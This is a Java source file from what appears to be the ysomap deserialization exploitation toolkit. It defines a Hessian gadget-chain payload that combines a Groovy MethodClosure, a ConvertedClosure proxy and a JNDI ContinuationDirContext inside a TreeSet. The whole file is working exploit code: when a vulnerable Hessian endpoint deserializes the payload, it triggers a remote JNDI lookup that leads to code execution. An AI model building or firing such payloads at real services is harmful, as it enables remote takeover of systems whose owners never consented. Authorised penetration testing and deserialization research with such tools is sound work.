package ysomap.payloads.hessian;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.rmi.JNDIRefBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.xstream.GroovyConvertedClosure;

import javax.naming.CannotProceedException;
import java.lang.reflect.Proxy;
import java.util.Hashtable;

/**
 * @author wh1t3p1g
 * @since 2021/8/6
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.FROHOFF })
@Targets({Targets.HESSIAN})
@Require(bullets = {"JNDIRefBullet","TomcatRefBullet"},param = false)
@Dependencies({"org.codehaus.groovy:groovy:2.4.3"})
public class GroovyWithRef extends HessianPayload {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return JNDIRefBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        CannotProceedException cpe = new CannotProceedException();
        ReflectionHelper.setFieldValue(cpe, "cause", null);
        ReflectionHelper.setFieldValue(cpe, "stackTrace", null);
        cpe.setResolvedObj(obj);
        ReflectionHelper.setFieldValue(cpe, "suppressedExceptions", null);
        Object ctx = ReflectionHelper.newInstance(
                "javax.naming.spi.ContinuationDirContext",
                new Class[]{CannotProceedException.class, Hashtable.class},
                cpe, new Hashtable<>());

        MethodClosure closure = new MethodClosure(ctx, "listBindings");
        ConvertedClosure convertedClosure = new ConvertedClosure(closure, "compareTo");
        Object map = Proxy.newProxyInstance(
                GroovyConvertedClosure.class.getClassLoader(),
                new Class<?>[]{Comparable.class}, convertedClosure);
        return PayloadHelper.makeTreeSet("ysomap", map);
    }
}
